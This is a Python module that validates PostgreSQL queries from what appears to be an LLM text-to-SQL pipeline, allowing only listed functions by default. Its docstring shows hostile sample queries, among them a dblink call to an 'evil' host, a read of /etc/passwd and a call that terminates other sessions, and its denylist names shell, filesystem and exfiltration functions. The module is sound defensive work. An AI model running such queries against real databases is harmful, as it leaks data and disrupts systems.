"""Function policy -- the layer the original specification did not have.

Read-only is not the same as side-effect-free. Every statement below parses as
an ordinary read-only ``SELECT`` and passes a statement-class check, a
``GRANT SELECT``-only role, and an AST walk for DML:

    SELECT dblink('host=evil…', 'SELECT …');   -- opens a NEW connection,
                                               -- outside the read-only txn
    SELECT query_to_xml('SELECT …', …);        -- executes a nested query
                                               -- string the AST never sees
    SELECT lo_import('/etc/passwd');           -- filesystem read
    SELECT pg_read_file('postgresql.conf');    -- filesystem read
    SELECT pg_sleep(3600);                     -- resource exhaustion
    SELECT nextval('some_seq');                -- a write
    SELECT pg_terminate_backend(pid) FROM …;   -- denial of service

The role grant stops some of these and the read-only transaction stops others,
but neither stops ``dblink``: it dials a *new* connection with its own
transaction and its own privileges. Nothing else in the stack catches that.

So: **default-deny**. sqlglot parses functions it recognises into typed nodes
(``exp.Sum``, ``exp.Lower``); anything it does not recognise becomes
``exp.Anonymous``. Anonymous functions must appear in :data:`ALLOWED_FUNCTIONS`
or the query is rejected, and :data:`DENIED_FUNCTIONS` overrides everything,
including operator-supplied additions.

The cost of default-deny is that a legitimate user-defined function in the
warehouse is rejected until an operator adds it to
``validation.extra_allowed_functions``. That is the right direction to fail:
a rejected valid query produces a clear error, an accepted malicious one does
not.
"""

from __future__ import annotations

from sqlglot import exp

#: Always rejected, no matter what else permits them. Grouped by what they do,
#: because the reason matters more than the name when reviewing this list.
DENIED_FUNCTIONS: frozenset[str] = frozenset(
    {
        # -- outbound connections: escape the read-only transaction entirely --
        "dblink",
        "dblink_exec",
        "dblink_open",
        "dblink_fetch",
        "dblink_connect",
        "dblink_connect_u",
        "dblink_send_query",
        "dblink_get_result",
        "dblink_disconnect",
        "postgres_fdw_disconnect",
        "postgres_fdw_disconnect_all",
        # -- filesystem access -------------------------------------------
        "pg_read_file",
        "pg_read_binary_file",
        "pg_ls_dir",
        "pg_stat_file",
        "pg_ls_logdir",
        "pg_ls_waldir",
        "pg_ls_archive_statusdir",
        "pg_ls_tmpdir",
        "pg_logdir_ls",
        "pg_relation_filepath",
        "lo_import",
        "lo_export",
        "lo_get",
        "lo_put",
        "lo_unlink",
        "lo_from_bytea",
        "loread",
        "lowrite",
        # -- nested query-string execution: bypasses AST inspection -------
        "query_to_xml",
        "query_to_xmlschema",
        "query_to_xml_and_xmlschema",
        # -- writes that look like reads ---------------------------------
        "nextval",
        "setval",
        "pg_notify",
        "pg_advisory_lock",
        "pg_advisory_lock_shared",
        "pg_advisory_xact_lock",
        "pg_advisory_xact_lock_shared",
        "pg_advisory_unlock",
        "pg_advisory_unlock_all",
        "pg_try_advisory_lock",
        "pg_try_advisory_xact_lock",
        # -- resource exhaustion -----------------------------------------
        "pg_sleep",
        "pg_sleep_for",
        "pg_sleep_until",
        # -- administrative / denial of service ---------------------------
        "pg_terminate_backend",
        "pg_cancel_backend",
        "pg_reload_conf",
        "pg_rotate_logfile",
        "pg_switch_wal",
        "pg_promote",
        "pg_create_restore_point",
        "pg_start_backup",
        "pg_stop_backup",
        "pg_backup_start",
        "pg_backup_stop",
        "pg_drop_replication_slot",
        "pg_create_physical_replication_slot",
        "pg_create_logical_replication_slot",
        "pg_replication_slot_advance",
        "pg_stat_reset",
        "pg_stat_reset_shared",
        "pg_stat_reset_single_table_counters",
        "pg_import_system_collations",
        # -- configuration: set_config writes; current_setting can read
        #    values an analytics query has no business reading.
        "set_config",
        "current_setting",
        # -- shell execution via extensions -------------------------------
        "pg_execute_server_program",
        "system",
        "shell",
    }
)

#: Anonymous functions that are safe. Everything not here is rejected.
ALLOWED_FUNCTIONS: frozenset[str] = frozenset(
    {
        # -- strings ------------------------------------------------------
        "btrim", "ltrim", "rtrim", "lpad", "rpad", "translate", "initcap",
        "ascii", "chr", "md5", "encode", "decode", "format", "concat",
        "concat_ws", "left", "right", "reverse", "repeat", "replace",
        "regexp_replace", "regexp_match", "regexp_matches", "regexp_count",
        "regexp_instr", "regexp_like", "regexp_substr",
        "regexp_split_to_array", "regexp_split_to_table",
        "split_part", "strpos", "substr", "substring", "overlay", "position",
        "starts_with", "unaccent", "length", "char_length", "octet_length",
        "bit_length", "upper", "lower", "quote_literal", "quote_nullable",
        "to_ascii", "normalize", "sha224", "sha256", "sha384", "sha512",
        # -- numbers ------------------------------------------------------
        "abs", "ceil", "ceiling", "floor", "round", "trunc", "sign", "mod",
        "div", "power", "sqrt", "cbrt", "exp", "ln", "log", "log10",
        "greatest", "least", "width_bucket", "random", "setseed", "pi",
        "degrees", "radians", "sin", "cos", "tan", "asin", "acos", "atan",
        "atan2", "sinh", "cosh", "tanh", "factorial", "gcd", "lcm",
        "min_scale", "scale", "trim_scale", "numeric",
        # -- dates and times ----------------------------------------------
        "age", "date_part", "date_trunc", "date_bin", "to_char", "to_date",
        "to_timestamp", "to_number", "make_date", "make_time",
        "make_timestamp", "make_timestamptz", "make_interval",
        "justify_days", "justify_hours", "justify_interval", "extract",
        "now", "current_date", "current_time", "current_timestamp",
        "localtime", "localtimestamp", "clock_timestamp",
        "statement_timestamp", "transaction_timestamp", "timezone",
        "isfinite", "date", "to_days",
        # -- aggregates ---------------------------------------------------
        "count", "sum", "avg", "min", "max", "array_agg", "string_agg",
        "json_agg", "jsonb_agg", "json_object_agg", "jsonb_object_agg",
        "bool_and", "bool_or", "every", "bit_and", "bit_or", "bit_xor",
        "percentile_cont", "percentile_disc", "mode", "corr", "covar_pop",
        "covar_samp", "regr_avgx", "regr_avgy", "regr_count", "regr_intercept",
        "regr_r2", "regr_slope", "regr_sxx", "regr_sxy", "regr_syy",
        "stddev", "stddev_pop", "stddev_samp", "variance", "var_pop",
        "var_samp", "grouping",
        # -- window -------------------------------------------------------
        "row_number", "rank", "dense_rank", "percent_rank", "cume_dist",
        "ntile", "lag", "lead", "first_value", "last_value", "nth_value",
        # -- arrays -------------------------------------------------------
        "array_length", "array_lower", "array_upper", "array_ndims",
        "array_dims", "array_position", "array_positions", "array_to_string",
        "string_to_array", "unnest", "cardinality", "array_append",
        "array_prepend", "array_remove", "array_replace", "array_cat",
        "array_fill", "generate_subscripts", "trim_array",
        # -- json ---------------------------------------------------------
        "json_build_object", "jsonb_build_object", "json_build_array",
        "jsonb_build_array", "json_extract_path", "jsonb_extract_path",
        "json_extract_path_text", "jsonb_extract_path_text",
        "json_array_elements", "jsonb_array_elements",
        "json_array_elements_text", "jsonb_array_elements_text",
        "json_object_keys", "jsonb_object_keys", "json_typeof", "jsonb_typeof",
        "json_array_length", "jsonb_array_length", "to_json", "to_jsonb",
        "row_to_json", "json_strip_nulls", "jsonb_strip_nulls",
        "jsonb_pretty", "jsonb_set", "jsonb_insert", "jsonb_path_query",
        "jsonb_path_exists", "jsonb_path_match", "json_populate_record",
        # -- conditionals and null handling --------------------------------
        "coalesce", "nullif", "num_nonnulls", "num_nulls",
        # -- series generation. Kept because date spines are a real
        #    analytics need; unbounded ranges are caught by the EXPLAIN cost
        #    guard, which sees the estimated row count.
        "generate_series",
        # -- identifiers --------------------------------------------------
        "gen_random_uuid", "uuid_generate_v4",
        # -- full-text search ---------------------------------------------
        "to_tsvector", "to_tsquery", "plainto_tsquery", "phraseto_tsquery",
        "websearch_to_tsquery", "ts_rank", "ts_rank_cd", "ts_headline",
        "setweight", "strip", "querytree",
        # -- casts and type helpers ---------------------------------------
        "cast", "convert", "convert_from", "convert_to",
        # -- ranges -------------------------------------------------------
        "lower_inc", "upper_inc", "lower_inf", "upper_inf", "isempty",
        "range_merge", "int4range", "int8range", "numrange", "tsrange",
        "tstzrange", "daterange",
    }
)


class FunctionPolicy:
    """Decides whether a function call is permitted.

    ``extra_allowed`` widens the allowlist for warehouse-local functions;
    ``extra_denied`` narrows it further. Denials always win, so an operator
    cannot accidentally re-enable ``dblink`` by pasting a broad allowlist.
    """

    __slots__ = ("_allowed", "_denied")

    def __init__(
        self,
        extra_allowed: tuple[str, ...] = (),
        extra_denied: tuple[str, ...] = (),
    ) -> None:
        self._allowed = ALLOWED_FUNCTIONS | {f.lower() for f in extra_allowed}
        self._denied = DENIED_FUNCTIONS | {f.lower() for f in extra_denied}

    def is_denied(self, name: str) -> bool:
        return name.lower() in self._denied

    def is_allowed(self, name: str) -> bool:
        lowered = name.lower()
        return lowered not in self._denied and lowered in self._allowed

    def check(self, names: set[str]) -> tuple[bool, bool]:
        """Return ``(permitted, explicitly_denied)`` for a set of aliases.

        A single call can be known by more than one name (see
        :func:`function_names`). Denial wins if *any* alias is denied, and
        permission requires only that *some* alias is allowed -- so neither a
        denylist entry nor an allowlist entry can be evaded by whichever
        spelling sqlglot happens to canonicalise to.

        The second flag separates "this function is dangerous" from "we do not
        recognise this function": the first is a security event that must never
        be handed to the repair node, the second is an ordinary error the model
        can fix by using a different function.
        """
        lowered = {name.lower() for name in names if name}
        if lowered & self._denied:
            return False, True
        return bool(lowered & self._allowed), False


def function_names(node: exp.Expression) -> set[str]:
    """Every name a function-call node might be known by.

    This is subtler than it looks. ``exp.Anonymous`` carries the raw source
    name, but a *typed* node carries sqlglot's canonical name, which is not
    always the PostgreSQL spelling: ``random()`` parses to ``exp.Rand`` whose
    ``sql_name()`` is ``RAND``. Checking only ``sql_name()`` would mean an
    operator adding ``"random"`` to the denylist silently has no effect --
    exactly the kind of policy that appears to work and does not.

    So typed nodes contribute both their canonical name and the identifier they
    generate as in the PostgreSQL dialect.

    Typed nodes are checked against the denylist too, even though everything
    sqlglot models today is standard SQL: a future release could start
    modelling something dangerous as a typed node and quietly move it out of
    the Anonymous branch, and this layer should not depend on that not
    happening.
    """
    if isinstance(node, exp.Anonymous):
        name = node.name
        return {str(name)} if name else set()

    if not isinstance(node, exp.Func):
        return set()

    names: set[str] = set()
    try:
        names.add(str(node.sql_name()))
    except Exception:
        names.add(type(node).__name__)

    rendered = _rendered_name(node)
    if rendered:
        names.add(rendered)
    return names


def _rendered_name(node: exp.Expression) -> str | None:
    """The identifier this node generates as in the PostgreSQL dialect."""
    try:
        sql = node.sql(dialect="postgres")
    except Exception:
        return None
    head = sql.split("(", 1)[0].strip()
    # Reject anything that is not a bare identifier: operators, casts, and
    # keyword forms such as `EXTRACT(year FROM x)` render as expressions and
    # have nothing useful to contribute here.
    if head and all(ch.isalnum() or ch == "_" for ch in head):
        return head
    return None


__all__ = [
    "ALLOWED_FUNCTIONS",
    "DENIED_FUNCTIONS",
    "FunctionPolicy",
    "function_names",
]
